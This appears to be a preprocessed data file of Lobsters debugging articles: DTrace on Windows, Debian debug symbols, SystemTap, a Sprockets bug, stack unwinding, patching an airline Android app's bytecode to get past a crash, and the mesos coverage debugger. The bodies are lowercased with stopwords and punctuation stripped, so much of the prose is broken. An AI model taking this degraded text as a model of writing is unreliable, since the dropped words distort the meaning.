sensitive data capture careful security benefit last probably important benefit converted tedious task enjoyable onei never thought would say happy documenting
216,Lobsters,debugging,Debugging,DTrace on Windows,https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/DTrace-on-Windows/ba-p/362902,dtrace window,dtrace etw dynamic tracing guide opendtrace dtrace window change source install run dtrace build window insider program enabled configured instruction bcd configuration set download download center path environment variable c program filesdtrace symbol path ntsymbolpath http msdlmicrosoftcomdownloadsymbols optional setup kernel debugger msdn link reboot running dtrace administrator mode dtrace lvn syscall syscall fbt pid etw etw sample directory file feedback link dtracedebug dtrace architecture dif virtual machine security section admin localsystem kernel debugger script signing powershell hkcusoftwareopendtracedtrace executionpolicy regsz hklmsoftwareopendtracedtrace executionpolicy regsz policy value bypass unrestricted remotesigned allsigned restricted dtraceexecutionpolicy conclusion,microsoft always looking engage open source community produce better solution community customer one useful debugging advance arrived last decade dtrace dtrace course need introduction dynamic tracing framework allows admin developer get realtime look system either user kernel mode dtrace cstyle high level powerful programming language allows dynamically insert trace point using dynamically inserted trace point filter condition error write code analyze lock pattern detect deadlock etc etw powerful static provide ability programmatically insert trace point runtime lot website resource community learn dtrace one comprehensive one dynamic tracing guide html book available dtraceorg website ebook describes dtrace detail authoritative guide dtrace also window specific example provide info starting opendtrace effort began github tried ensure portable implementation dtrace different operating system decided add support dtrace window using opendtrace port created window branch dtrace window opendtrace project github change made support dtrace window available next month plan work opendtrace community merge change source code also available party source website maintained microsoft without ado let get setup use dtrace window install run dtrace prerequisite using feature window insider build higher available window capture tracing info process window insider program enabled configured valid window insider account visit setting update security window insider program detail instruction bcd configuration set bcdedit set dtrace note need set bcdedit option upgrade new insider build download install dtrace package download center installs user mode component driver additional feature demand package necessary dtrace functional optional update path environment variable include c program filesdtrace set path path c program filesdtrace setup symbol path create new directory caching symbol locally example mkdir c symbol set ntsymbolpathsrv c symbol http msdlmicrosoftcomdownloadsymbols dtrace automatically downloads symbol necessary symbol server cache local path optional setup kernel debugger connection target machine msdn link required want trace kernel event using fbt provider note need disable secureboot bitlocker c enabled want setup kernel debugger reboot target machine running dtrace launch cmd prompt administrator mode get started sample oneliners syscall summary program second dtrace fn exit syscall entry num pid execname count summarize timer setcancel program second dtrace fn exit syscall nt timer entry probefunc execname pid count dump system process kernel structure requires symbol path set dtrace n begin print struct nt eprocess nt psinitialsystemprocess exit tracing path ntfs running notepadexe requires kd attach run command launch notepadexe dtrace fn fbt ntfs execname notepadexe command dtrace lvn syscall list probe parameter available syscall provider following provider available window instrument syscall ntos system call fbt function boundary tracing kernel function entry return pid usermode process tracing like kernelmode fbt also allowing instrumentation arbitrary function offset etw event tracing window allows probe defined etw provider help leverage existing operating system instrumentation dtrace one addition done dtrace allow expose gain information window already provides etw window sample script applicable window scenario sample directory source file feedback dtrace window different typical feature window going rely insider community guide u hit problem bug please use feedback hub let u know launch feedback hub clicking link select add new feedback please provide detailed description issue suggestion currently automatically collect debug trace verbatim feedback crucial understanding reproducing issue pas verbose log set dtracedebug environment variable collect verbose dtrace log submit dtrace architecture let talk little internals architecture supported dtrace mentioned dtrace window port opendtrace reuses much user mode component architecture user interact dtrace dtrace command generic frontend dtrace engine script get compiled intermediate format dif userspace sent dtrace kernel component execution sometimes called dif virtual machine run dtracesys driver traceextsys trace extension new kernel extension driver added allows window expose functionality dtrace relies provide tracing window kernel provides callouts stackwalk memory access implemented trace extension apis functionality used dtracesys documented call security security window key customer security model dtrace make ideally suited window dtrace guide linked talk dtrace security performance impact would useful anyone interested space read section high level dtrace us intermediate form validated safety run execution environment think c java execution environment also handle run time error avoid crashing system addition cost probe minimal visibly affect system performance unless enable many probe performance sensitive path dtrace window also leverage window security model useful way enhance security customer connect dtrace trace engine account need part admin localsystem group event originating kernel mode fbt syscalls kernel previous mode etc traceable kernel debugger attached read kernelmode memory probe parameter kernelmode originated event kernelmode global variable etc following must true dtrace session security context either tcb loaddriver privilege enabled secure boot active trace usermode process user need debug privilege debug access target process script signing addition also updated dtrace window support signing script follow model powershell support signing script system wide dtrace script signing policy knob control whether check signing dtrace script policy knob controlled registry default check signature dtrace script use following registry key enforce policy machine user level user scope hkcusoftwareopendtracedtrace executionpolicy regsz machine scope hklmsoftwareopendtracedtrace executionpolicy regsz policy value dtrace policy take following value bypass perform signature check default policy set registry key want deviate policy unrestricted perform check local file allow user consent use unsigned remote file remotesigned perform check local file requires valid trusted signature remote file allsigned require valid trusted signature file restricted script file must installed system component signature trusted source also set policy defining environment variable dtraceexecutionpolicy required value conclusion excited release first version dtrace window look forward feedback window insider community cheer dtrace team andrey shedel gopikrishna kannan hari pulapaka
217,Lobsters,debugging,Debugging,Debugging experience in Debian,https://michael.stapelberg.ch/posts/2019-02-15-debian-debugging-devex/,debugging experience debian,see window title running raspberry pi debian raspberry pi debian image enabling debug symbol debian debugpackage debian wiki page one finding debug symbol package debian finddbgsympackages obtaining source code debian specifying source directory positive example fedora ideal world http githubcomedolstradwarffs conclusion rsync debianrules,recently user reported see window title running raspberry pi debian copied latest raspberry pi debian image onto sd card booted able reproduce issue conceptually point able install start gdb set break point step code enabling debug symbol debian debian default strip debug symbol building package conserve disk space network bandwidth motivation reasonable user never need debug symbol unfortunately obtaining debug symbol need unreasonably hard begin configuring additional apt repository contains automatically generated debug package raspi cat etcaptsourceslistddebuglist eot deb http debdebianorgdebiandebug busterdebug main contrib nonfree eot raspi apt update notably debian package debug package debugpackage debian wiki page explains started generating debug package ending dbgsym automatically package updated might come debug package ending dbg might preserve debug symbol install debug package know one need finding debug symbol package debian debugging obviously need least package us number library whose code may need step debiangoodies package ship tool called finddbgsympackages print required package debug executable core dump running process raspi apt install debiangoodies raspi apt install finddbgsympackages symbol name line number information available gdb effectively stepping program access source code required obtaining source code debian naively one would assume apt source sufficient obtaining source code debian package however apt source default package candidate version version installed system addressed issue tool default installed version extract source need configure yet another apt repository raspi cat etcaptsourceslistdsourcelist eot debsrc http debdebianorgdebian buster main contrib nonfree eot raspi apt update regardless whether use apt source one remaining problem directory mismatch debug symbol contain certain path path typically extracted source debugging need tell gdb location source tricky debug call across different source package gdb pwd working directory gdb list main main loop evunref mainloop int main int argc char argv keep symbol pointing string constant gdb backtraces static const char attribute used char overrideconfigpath null gdb list xcbconnect srcxcbutilc file directory see specifying source directory gdb manual dir command allows add multiple directory source path pretty tedious though work program positive example fedora fedora conceptually share step experience fedora much better run gdb tell next step gdb reading symbol debugging symbol found done missing separate debuginfos use dnf debuginfoinstall watch happens run suggested command dnf debuginfoinstall enabling updatesdebuginfo repository enabling fedoradebuginfo repository installed complete single command understood intent enabled required repository installed required package debug symbol source code stored eg unfortunately gdb seem locate source seems like bug one downside fedora approach gdb print required dependency actually run program may need run multiple dnf command ideal world ideally none manual step described would necessary seems absurd much knowledge required efficiently debug program debian case point learnt finddbgsympackages day ago talking one contributor installing gdb user need debug symbol source transparently provided lazyloading fuse file system buildpackaging infrastructure assured predictable path automated debug symbol extraction could transparent quick reliable debugging program within debian nixos dwarffs implementation idea http githubcomedolstradwarffs conclusion agree removal debug symbol general optimization think every linux distribution strive provide entirely transparent debugging experience even know debug symbol present default debian really fall short regard getting debian fully transparent debugging experience requires lot technical work lot social convincing experience programmatically working debian archive package tricky ensuring package debian release debug package let alone predictable path seems entirely unachievable due fragmentation packaging infrastructure holdout blocking progress goto example rsync debianrules intentionally still adopted debhelper surprise debug symbol rsync debian
218,Lobsters,debugging,Debugging,A brief introduction to SystemTap,http://www.linux.it/~ema/systemtap-intro.html,brief introduction systemtap,brief introduction systemtap read documentation,brief introduction systemtap systemtap allows instrument linux system runtime using gather insight running program including linux kernel without invoking specific way modifying indeed even access source code debian system derivative including ubuntu get started systemtap installing systemtap package well linux kernel header apt install systemtap linuxheaders uname r verify systemtap working correctly try hello world oneliner sudo stap v e probe oneshot println hello world pas parsed user script library script using kb m pas analyzed script probe function embeds globals using kb m pas using cached pas using cached pas starting run hello world pas run completed m give another go without v terse le exciting output systemtap installed working machine let use give peek l hood order systemtap inspect behavior given program need access debugging symbol case l debian provided coreutilsdbgsym package package installed ask systemtap list available probe point simplify little say equivalent function l call let list example function might something usernames sudo stap l process binls function user process binls function formatuser u uidt width int statok bool process binls function formatuserorgroup name char const id long unsigned int width int process binls function formatuserorgroupwidth id long unsigned int process binls function formatuserwidth u uidt process binls function getuser uid uidt match struct userid formatuser function seems interesting see take three argument u width statok let print invocation well value u sudo stap e probe process binls function formatuser printf formatuser uid n u systemtap complains buildid mismatch try passing dstpnobuildidcheck command line case curious read man error buildid find try running l l etcpasswd see following output systemtap formatuser try running l etcpasswd without l notice systemtap produce output indicating l call formatuser function case systemtap fullyfledged programming language variable loop conditionals forth oneliners shell fine exploration simple example like one longer script might want save work file let creating lsnonrootstp file slightly change previous example printing formatuser call file owned nonroot user systemtap example lsnonrootstp probe process binls function formatuser u printf formatuser uid n u run script stap v lsnonrootstp see output running l l file owned user root linux kernel coreutils need install debugging symbol kernel currently running different though kernel debug symbol huge example case kernel debug symbol make sure got plenty disk space available patience needed waiting apt install linuximage uname r dbg thing let look available linux kernel probe point matching icmp reply pattern sudo stap l kernelfunction icmp reply kernelfunction icmppushreply icmpparam struct icmpbxm struct ipc struct ipcmcookie rt struct rtable kernelfunction icmpreply icmpparam struct icmpbxm skb struct skbuff ipc struct ipcmcookie struct kernelfunction skb struct skbuff tmphdr struct struct msg struct struct interesting let run ping localhost one terminal see expect icmpreply function get called stap probe kernelfunction icmpreply println reply silence ha localhost resolve icmpreply deal function looking extend script follows see kernel sending echo reply echo reply probe kernelfunction icmpreply println sending echo reply probe kernelfunction println sending echo reply systemtap requirement large debug package gcc undesirable production system luckily systemtap designed develop compile probe build host eg laptop designated build server run production host minimal dependency example compile hello world probe development machine sudo stap e probe oneshot println hello word hello helloko command generates kernel module named helloko copied production host run staprun helloko systemtapruntime need installed target machine kernel running build target host differ need specify target linux kernel version r example target kernel sudo stap e probe oneshot println hello word hello r introduction always executed stap root production system might want add user staprun group instead scratched surface systemtap go ahead read documentation play fun last modified fri oct
219,Lobsters,debugging,Debugging,Debugging in RubyBusting a Year-old Bug in Sprockets,https://blog.heroku.com/debugging-year-old-sprockets-bug,debugging rubybusting yearold bug sprocket,listen article codetriage sprocket sprocketsrails package sinatra asset livedebugging session ruby debugging guide thousand opensource project bundler use irb explore ruby pull request fix bug logging solution available,listen article debugging important skill develop work way complex project seasoned engineer sixth sense squashing bug built impressive collection tool help diagnose fix bug member heroku ruby team creator codetriage today look tool used journey fix gnarly bug sprocket sprocket asset packaging system written ruby lie heart rail asset processing pipeline end post know sprocket work debug ruby sprocket give developer convenient way compile minify serve javascript cs file extensible preprocessor pipeline support language like coffeescript saas sc included rail via sprocketsrails gem also used standalone fashion example package sinatra asset earlier month recorded livedebugging session experienced particularly curious issue sprocket noticed bug broke critical asset precompilation rake task name project folder changed successive task execution project folder renames might seem relatively uncommon happen frequently heroku build happens unique directory name bug interesting even interesting learning debugging process learn tool step use narrow root cause ultimately fix bug like watch full debugging session check video follow along reading text walk debug workflow find root cause bug headscratching nonobvious bug worth investigating may lead unnoticed unreported bug thankfully ruby come powerful debugging tool easy use beginner nice overview check ruby debugging guide cover basic like difference p put also discus interactive debugger available ruby ecosystem rest post however need know anything advanced put best way learn debugging dive try let set sprocket local environment need rail app reproduce bug use open source example creator codetriage natural use application demonstrate problem although reproduce rail app us sprocket codetriage helped developer triage issue thousand opensource project first clone codetriage repository install dependency switch branch contains code need reproduce bug working ruby environment assumed git clone git githubcom codetriagecodetriage cd codetriage gem install bundler bundle install cp configdatabaseexampleyml configdatabaseyml git checkout next execute following step make bug show local environment rm rf tmpcache rm rf publicassets next run rake task precompiling asset succeed railsenvproduction binrake asset precompile change name project directory copying file new directory called codetriageafter deleting old codetriage directory cd cp r codetriage codetriageafter rm rf codetriage cd codetriageafter one time run asset precompile rake task railsenvproduction binrake asset precompile task fail time produce following error message sprocket complaining find file privatetmpreprocodetriageappassetsjavascriptsapplicationjserb actually make sense last step changed codetriage codetriageafter project folder name yet looking codetriage note privatetmprepro part path may different based cloned codetriage repository reproduced bug video next step jump code sprocket dependency one line stack trace method called fetchassetfromdependencycache application depends reading code library required debugging especially ruled issue code written ruby defacto gem manager bundler contains helpful command called bundle open open source code gem favorite editor run like bundle open sprocket long editor bundlereditor environment variable set preferred code editor open project directory specified gem browse gem source code even modify adding print statement see value variable trying various fix see work error message implied wrong value stored sprocket cache next step look cache confirm cache stored disk across many file first need find specific file contains record want inspect key record digest sprocket cache id value try find file sprocket code open navigate libsprocketsloaderrb find method fetchassetfromdependencycache toward end documentation method provides insight sprocket us idea pipeline history dependency aid caching get backstory recommend watching video starting sixminute mark examined ondisk content sprocket cache looking id cache key specific object sprocket cache grep r tmpcache helpful debugging command file away later grep r search tmpcache directory looking file contain string sprocket cache key r flag make traverse directory recursively case grep command produce cache file use cat view content inside cache file find something unexpected absolute path asset sprocket cache relative path absolute path since changed absolute path project directory create bug quite likely culprit investigate confirm suspicion fire irb interactive ruby debugger new ruby irb recommend use irb explore ruby good way see use simple powerful musthave ruby debugging toolkit use irb inspect file cache sprocket point view irb reirb main require sprocket reirb main sprocket environmentnewcache reirb main sprocket environmentnewcacheget unfortunately work cache key cache id move confirming hypothesis another way still include example let know irb something use ruby code specifically handy environment class sprocket fix bug let modify toload tolink method loaderrb force relative path object going cache coming using compressfromroot expandfromroot utility method sprocket baserb ensures absolute path make way cache consequently renaming project directory cause issue subsequent asset compilation cachedasset metadata toload cachedasset metadata toload empty cachedasset metadata toload cachedasset metadata toload dup cachedasset metadata toload map uri compressfromroot uri end cachedasset metadata tolink cachedasset metadata tolink empty cachedasset metadata tolink cachedasset metadata tolink dup cachedasset metadata tolink map uri compressfromroot uri end pull request fix bug contains test prove fix work writing test bug fix best practice always strive follow best way prevent old bug crawling back codebase inevitably code something possibly happen need get debugging tool hope picked new one post code something possibly happen production app run heroku make sure familiarize variety logging solution available addons addons make running debugging problem heroku easier take second set
221,Lobsters,debugging,Debugging,Retrieving function arguments while unwinding the stack,http://nikhilism.com/post/2019/retrieving-function-arguments-while-unwinding-the-stack/,retrieving function argument unwinding stack,sampling profilers recent discussion ben frederickson subsequent pyspy implementation would want access argument improving python crash reporting crashpad think would cool profiler could sample native stack detects managed language kind plugin mechanism infer managed code running part profile gathering setting stage example code argument passing calling convention caller callee unwinding stack debug information dwarf section pretty comprehensive optimization several option plcrashreporter one lul unwinding writing dwarf information without debug information well documented abi compact unwind encoding good explanation format first frame finding way using external information using trampoline nice sketch conclusion,debugger profiler crash reporter unwinding call stack reliably retrieve function argument every function stack originally intended later part sampling profilers series recent discussion ben frederickson subsequent pyspy implementation helped crystallize thought figured write separately retrieving function argument trivial certain case pure guesswork others going dive outline situation easiest hardest would want access argument people need apparent context debugger exact argument usually reason program failing debugger try best extract argument function gdb bt bar foo main course run release build get nothing gdb bt bar foo main spent week working improving python crash reporting since fascinated able gain information managed language without modifying interpreter without requiring custom software modification crash reporting tool access argument would let collect useful debug info wild imagine extending tool like crashpad identify argument certain type annotate crash report pretty printed information type core dump contains information instead using auxiliary information python interpreter derive execution context one could simply walk native stack interleave python stack every pyevalevalframeex call deterministic way similarly dearth crosslanguage profilers well known tool like perfbpfdtrace really meant native code interpreter higher level language usually profiler understands language think would cool profiler could sample native stack detects managed language kind plugin mechanism infer managed code running part profile gathering could interleave stack profile showing hotspot across language python slow time spent python spent c code waiting resource acquisition could see complex desktop application language process uncommon currently difficult get comprehensive profile across setting stage post mostly focus linux macos quickly look differs window similar respect arm much different come using register argument passing similar concept apply assemblydwarf output clang version target post assumes basic familiarity assembly language register stack function call frame concept unwinding example code refer throughout rest post testprogc file compiled several different executables debug debugopt look makefile precise build configuration include stdioh void bar int bararg printf number dn bararg void foo int fooarg bar fooarg printf unrelatedn int main foo argument passing calling convention call stack foo caller bar callee foo bar function argument assumed integer pointer fit single register argument pushed onto stack reverse order followed return address saved eip callee access indexing ebp argument passed rdi rsi rdx rcx register order finally unless optimization enabled ebprbp delineates frame become useful later unwinding stack debugger tool usually suspends thread interest start unwinding process retrieve call stack comprehensive topic work progress post assume somehow retrieve stack frame function argument want retrieve debug information easiest case debugger always show argument assumes executable built debug information g switch gcc clang linux mac dwarf format used debug information stored section debuginfo debug information pretty comprehensive detailing debugger location function argument stack variable example relevant information retrieve bararg first argument function bar obtained via dwarfdump debug dwtagformalparameter dwatlocation len dwopfbreg dwatname bararg dwatdeclfile homensmnikhilunwindargumentstestprogc dwatdeclline dwattype tell debugger exactly argument stored case collusion compiler debugger simplify thing look disassembly objdump intel debug bar push rbp mov rbp rsp ec sub movabs fc mov dword ptr edi fc mov esi dword ptr mov rdi rax mov ce fe ff ff call printf plt mov dword ptr eax add pop rbp ret nop dword ptr raxrax prologue compiler simply us byte stack space stash edi low bit rdi emits dwarf information indicating bararg found dwopfbreg fbreg course rbp nice argument never move around regardless function debugger stopped optimization dwarf flexible enough format represent kind transformation indicate memory location identifier long debug information enabled even optimized build debugger retrieve argument point function compiler simply emit dwarf move data around throughout function disassembly debugopt compiled dwarf bararg bar mov ecx edi bf mov xor eax eax ce mov esi ecx fe ff ff jmp printf plt foo push rax lea esi bf mov xor eax eax fe ff ff call printf plt bf mov pop rax fe ff ff jmp put plt nop dword ptr raxrax main push rax bf mov mov xor eax eax ae fe ff ff call printf plt bf mov fe ff ff call put plt xor eax eax pop rcx ret dwtagformalparameter dwatname bararg dwatdeclfile homensmnikhilunwindargumentstestprogc dwatdeclline dwattype going well compiler several different optimization foo bar actually inlined main constant optimization done substituted passed printf argument prologue epilogue generated inlined function dwarf debugging inforamtion entry die say anything location bararg lack dwatlocation indicates look elsewhere dwarf tutorial skip detail instead look dwarf information main dwtagformalparameter dwatconstvalue dwatabstractorigin formal parameter nowinlined bar stated constant value complicated program compiler would emit location list argument describes mapping instruction pointer range offset various memory locationsregisters argument accessed point see really easy retrieve argument debug information available using debugger need ship dwarf parser fortunately several option dwarf complex format various people implemented custom parser specific use case plcrashreporter one unwinding program crashed restricted memory allocation mozilla wrote lul optimized unwinding profiler finally writing assembly hand writing dwarf information assembly good way assist debugger without debug information value debug information overstated sure parse dwarf nontrivial gave answer life going get pretty miserable without precise description argument going rely knowledge stack register first slightly easy one system convention differ among operating system generally least argument stack function foo want call bar int int int first push integer onto stack call bar call instruction push current eip point past call instruction stack indicating return address leverage hold true regardless optimization course generic solution since know many argument going present looking specific function know signature work retrieve argument need reliably find frame delineated ebp pushed onto stack prologue function set base function frame arg arg ret old ebp ebp esp first currently executing function frame retrieved querying o thread context separate post inprogress specific mechanic cover ebp known start scanning perform manipulation need based argument type integer pointer type first argument next fact stack immutable except currently executing function allows u strong guarantee argument remaining certain gotchas leaf function may always ebp based indexing addition still gotten determining name executing function case want argument specific function get complicated quickly topic another post ironically common setup production system release mode also trickiest think say reasonable certainty naive extraction argument difficult even one know function one looking argument look like minimum one would need disassembler kind register analysis track move let understand end situation first need unwind information determine frame boundary fortunately unwinding information always present elf macho nondebugger tool like profilers crash reporter need well known use case backtrace function addition certain language like c use exception handling information subset dwarf enough information identify frame boundary value certain register library like libunwind use well documented abi section stack unwind algorithm linux ehframe section usually extended dwarf use dwarfdump f file read ehframe section mac usually compact unwind encoding unwind information bar release binary optimization dwarfdump f release cie offset cie index fde offset length eh aug data len cfa cfa cfa cfa cfa register number standardized rbp rsp return address ian lance taylor good explanation ehframe format want understand fully disassembly help bar push rbp mov rbp rsp ec sub cfa refers canonical frame address value rsp previous frame right call instruction caller see cfa move every instruction manipulates stack getting back goal case enough information reconstruct call stack direct reference argument could use register location figure value rdi instruction particular certainly always like initially looking libunwind api constant defined register one simply call unwgetreg right constant get value rdi one try run unwindrdi program quickly experience disappointment rdi never change unwindrdi number ip rdi rdi fetch success signal ip rdi rdi fetch success signal ip rdi rdi fetch success signal ip rdi rdi fetch success signal ip rdi rdi fetch success signal number unrelated register segmented calleesaved callersaved engineering would argument passing register caller saved unwgetreg specifically say ordinary stack frame normally possible access preserved calleesaved register framerelated register stackpointer however signal frame see unwissignalframe usually possible access register unwinder really need rip rsp determine next frame look unwind information release spot calleesaved register indeed present sometimes cie offset cie index fde offset length eh aug data len cfa cfa cfa cfa cfa cfa cfa cfa cfa cfa map register incrementally available unclear calleesaved register sometimes required one reason seems next frame cfa defined term probably allow exception handler run code maintaining guarantee calleesaved register restored first frame surely enough information currently executing frame every single register right get initial value rdi since function executing register available platform specific context retrieval method either signal handler linux threadgetcontext macos give rdi rsi friend remember always map actual argument assertion hold function entry debugger could deliberately stop function entry retrieve argument unfortunately crash reporter profilers luck since stop arbitrary instruction rdi could already discarded overwritten point function could called another function point lost one would need tool could parse machine code keep track argument register moved around step potentially reconstruct memory location assumes overwriting occurred point certainly given trying find argument without modifying code finding way willing modify code either runtime compiling extra plugins make progress towards task using external information one option get argument use information directly managed language runtime example python one independently retrieve list pyframeobjects done dropbox crashpad work pyspy frame mapping first argument every pyevalevalframedefault function pyevalevalframedefault function usually exported public symbol table python linked dynamic library interleaving stack easy determine function executed full unwind pyspy also collect pyframeobject list every time pyevalevalframedefault encountered interleave python context native stack using trampoline another deterministic involved option usually work retrieving argument specific function interest trampoline piece code insert runtime replace function entry point dynamically create new function thin air redirect various pointer function called instead original custom function stash away argument specific place either stack callee saved register jump back code original function profiler replacement running program address space start unwind time encounter trampoline know exactly look argument downside trampoline platform o specific vmprof nice sketch like read language make process easier since python one write standard c extension replace default evaluation function custom function stash argument simplifies trampoline setup described neither option universal instrumenting every function like would serious performance cost may make sense program test inthewild augmentation postfacto collection crash reporter conclusion seen ability retrieve function argument lie spectrum hope post gave insight complexity problem thankful compiler vendor provide comprehensive information debug build without lot problem would impossible solve least answer clear binary shipped user profilers way problem even easy generic crash reporter live without deterministic information perhaps extended unwind info compiler mode regularly stash argument onto stack even release build oargs necessary thanks ben frederickson reviewing post
222,Lobsters,debugging,Debugging,Fixing an airline app bug for fun and profit,https://pmatias.me/2019-02/fixing-airline-app-fun-profit/,fixing airline app bug fun profit,problem statement debugging issue bytecode viewer nobreak space quick dirty fix result discussion root cause pure java locale data wrapper locale data since bug started manifest locale data change insert nobreak space new formatter adding spacing unit test come app developer notice several month uncaught exception handler conclusion,azul linhas aéreas brazilian airline offer cheaper ticket customer buying mobile app ticket bought website extra convenience fee charged unfortunately mobile app bug several month cause close user fill payment method article patch app bytecode fix bug problem statement booking flight using website azul charge convenience fee brl per passenger funny convenience fee often expensive embarkation fee charged airport luckily enough flight booked using mobile app exempt convenience fee however conclude booking since app crash select payment method debugging issue since app suddenly closed first hypothesis come mind uncaught exception fired app crash reporting mechanism silent one order test hypothesis launch adb logcat try book flight app crash get following stack trace javalangnumberformatexception input string javalanglongparselong javalanglongvalueof brcomvoeazulcontrollercomprapassagemcomprapassagemcontrollerremoverseparadoresdevalor brcomvoeazulcontrollercomprapassagemcomprapassagemcontrolleractiongetpaymentinstallmentinfo brcomvoeazulcontrollercomprapassagemcomprapassagemcontrolleractionapplypromotioncode brcomvoeazulfragmentcomprapassagemcomprapassagempagamentofragment androidwidgetadapterviewfireonselected androidwidgetadapterviewdispatchonitemselected androidwidgetadapterviewaccess androidwidgetadapterview selectionnotifierrun androidoshandlerhandlecallback androidoshandlerdispatchmessage androidoslooperloop androidappactivitythreadmain javalangreflectmethodinvoke native method comandroidinternalosruntimeinit methodandargscallerrun comandroidinternaloszygoteinitmain nice seems like app trying convert amount due cent long however leading space string causing conversion fail forget trim string retrieve apk device try open using bytecode viewer luck give could decode resource resourcesarsc however problem since intend understand modify bytecode thus extract classesdex open let decompile culprit method mentioned stack trace public long removerseparadoresdevalor final bigdecimal bigdecimal final decimalformat decimalformat decimalformat numberformatgetcurrencyinstance new locale pt br decimalformatsetmaximumfractiondigits final decimalformatsymbols decimalformatsymbols decimalformatgetdecimalformatsymbols decimalformatsymbolssetcurrencysymbol decimalformatsetdecimalformatsymbols decimalformatsymbols return longvalueof decimalformatformat bigdecimal replace replace trim amusing trim string leading whitespace opening logcat output hex editor realize whitespace char composed byte correspond unicode code point nobreak space trim method seem strip quick dirty fix decompiler rarely able generate wellformed enough java recompiled class therefore easier work directly bytecode changing bytecode viewer pane mode editable smalidex look removerseparadoresdevalor method insert following instruction last call replace moveresultobject conststring conststring invokevirtual ljavalangstring replace ljavalangcharsequence ljavalangcharsequence ljavalangstring cause replace called trim bytecode viewer able save modified code back classesdex file calling smali hood however need zip back inside apk manually since able open apk directly bytecode viewer sign apk debug key jarsigner verbose sigalg digestalg keystore homeandroiddebugkeystore azulapk androiddebugkey password android finally need uninstall original app install modified apk result able book flight wife paid brl embarkation fee two passenger whereas booked website would need pay brl discussion far good fixed bug saved money scientist might asking question root cause first interesting fact issue happen removerseparadoresdevalor run openjdk turn openjdk pure java implementation decimalformat looking locale data us see insert ordinary space currency symbol hand android implementation decimalformat wrapper looking locale data us see insert nobreak space currency symbol since bug started manifest locale data responsible currency format changed last time sep change whitespace currency symbol numeric value however interesting fact current code automatically insert nobreak space currency symbol numeric value even present pattern specified locale data since happen new formatter responsible adding spacing first commited sep unit test fixed apr came change locale data since android ship locale data android since first release android even recent release come app developer notice several month obviously test app android way could get know bug collect crash report funny uncaught exception handler app installs related app rating yes serf purpose avoiding ask user rate app app crashed least course user would give many star conclusion perhaps easier launch android emulator book flight could know strongly recommend azul linhas aéreas reimplement removerseparadoresdevalor method adopting reliable implementation quick dirty fix example avoiding dependence locale data work correctly start collecting crash report deal accordingly
223,Lobsters,debugging,Debugging,gamozolabs/mesos | Binary coverage tool without binary modification for Windows,https://github.com/gamozolabs/mesos,gamozolabsmesos binary coverage tool without binary modification window,summary feature code coverage automatic full minidump saving ida coloring quick usage guide api performance usage creating mesodepszip example output generating meso file symbol resolution advanced usage example usage meso usage commandline option example usage use limitation nt ida technical detail minidump autogenned filename meso file format,summary mesos tool gather binary code coverage userland window target without need source recompilation also provides automatic mechanism save full minidump process crash mesos mesos technically really fast debugger capable handling ten million breakpoints using debugger apply breakpoints every single basic block program breakpoints removed hit thus mesos converges coverage gathering coverage cost first time basic block hit effectively successor year old chrome ipc fuzzer nt fuzz component highperformance debugger debugger apply million breakpoints gather coverage handle thousand breakpoints per second modify memory inject input strategy worked well historically still goto tooling fuzzing target live system box used gather simple code coverage designed easily modified add fast breakpoint handler inject input example put breakpoint ntreadfile return modify buffer flight used chrome modify inbound ipc traffic browser feature code coverage automatic full minidump saving ida coloring quick usage guide set path path path c program filesida generate mesos first time slow powershell pid python generatemesospy processida gather coverage target cargo build release targetreleasemesosexe pid applying million breakpoints big deal c devmesos targetreleasemesosexe mesos true target true applied breakpoints total breakpoints notepadexe applied breakpoints total breakpoints ntdlldll applied breakpoints total breakpoints applied breakpoints total breakpoints kernelbasedll applied breakpoints total breakpoints oleaccdll applied breakpoints total breakpoints textinputframeworkdll applied breakpoints total breakpoints coreuicomponentsdll applied breakpoints total breakpoints coremessagingdll applied breakpoints total breakpoints ntmartadll applied breakpoints total breakpoints iertutildll api currently tool debugger lib easily bring start using make custom debugger however api finalized yet suggest building anything using yet may change quickly message removed probably stable performance register request breakpoints module load millionsecond apply actually install breakpoints target millionsecond clear breakpoints millionsecond hit handle breakpointssecond given breakpoints cleared hit coverage mean observe new block per second hit breakpoint longer performance cost c devmesosexamplesbenchmark cargo run release finished release optimized debuginfo target running targetreleasebenchmarkexe mesos true target true registered breakpoints second second applied breakpoints second second cleared breakpoints second second hit breakpoints second second usage use mesos major step first module running process saved second module loaded ida output list basic block meso format finally mesos run target process gather coverage creating mesodepszip step first thing create zip file containing module loaded given pid script requires internet designed easily dropped onto new vms mesos generated target application depends powershell later installed default window window server run pid replaced process id want gather coverage c devmesos powershell powershell true target true c devmesos optionally supply outputzip zipfile change output zip file name create mesodepszip look contains module used process ran script targeting example output c devmesos powershell outputzip testingzip powershell true target true c devmesos powershell expandarchive testingzip destinationpath example c devmesos powershell getchilditem example rec file name cachecprogram filescommon filesmicrosoft sharedinktiptsfdll cachecprogram filesinteloptaneshellextensionsiastorafsserviceapidll cachecprogram fileswidcommbluetooth softwarebtmmhookdll cachecprogram file common generating meso file generate meso file operate mesodepszip created last step nt matter zip came allows zip come vm powershell script run basic usage python generatemesospy processida use mesodepszip file input use ida process executables zip file figure basic block create cache folder bunch file file named based module name module timedatestamp pe header imagesize field pe header dlls uniqued pdb symbol store good enough u see file extension original binary file meso extension breakpoint list file cached ida database original binary symbol resolution limitation make meso file quality symbol resolution depends tool used generate ability resolve symbol example ida publicprivate symbol ntsymbolpath configured correctly advanced usage check program usage recent usage whitelist blacklist option allow use list string filter amount mesos generated helpful coverage outside target module probably relevant introduces overhead unnecessary processing c devmesos python generatemesospy usage generatemesospy processida process file mesodepszip file generatemesospy processidawhitelist str str str process file containing one string provided generatemesospy processidablacklist str str str process file file except containing one provided string example python generatemesospy processidawhitelist process file python generatemesospy processidablacklist ntdlldll process file except ntdlldll path requirement processida must path example usage c devmesos python generatemesospy processidawhitelist processing processing processing processing processing processing processing processing meso usage onto actual debugger created meso file tell put breakpoints module first need build rust cargo build release simply run pid targetreleasemesosexe pid commandline option currently option mesos run mesos without argument get recent list c devmesos targetreleasemesosexe usage mesosexe pid freq verbose print explicit meso file explicit meso file freq treat breakpoints frequency breakpoints verbose enables verbose print debugging print print breakpoint info every single breakpoint explicit meso file load specific meso file regardless loaded module standard usage mesosexe pid example usage c devmesos targetreleasemesosexe mesos true target true applied breakpoints total breakpoints notepadexe applied breakpoints total breakpoints ntdlldll applied breakpoints total breakpoints applied breakpoints total breakpoints kernelbasedll applied breakpoints total breakpoints coreuicomponentsdll applied breakpoints total breakpoints coremessagingdll applied breakpoints total breakpoints ntmartadll applied breakpoints total breakpoints iertutildll removed breakpoints syncing code coverage database sync complete total unique coverage entry detached process use 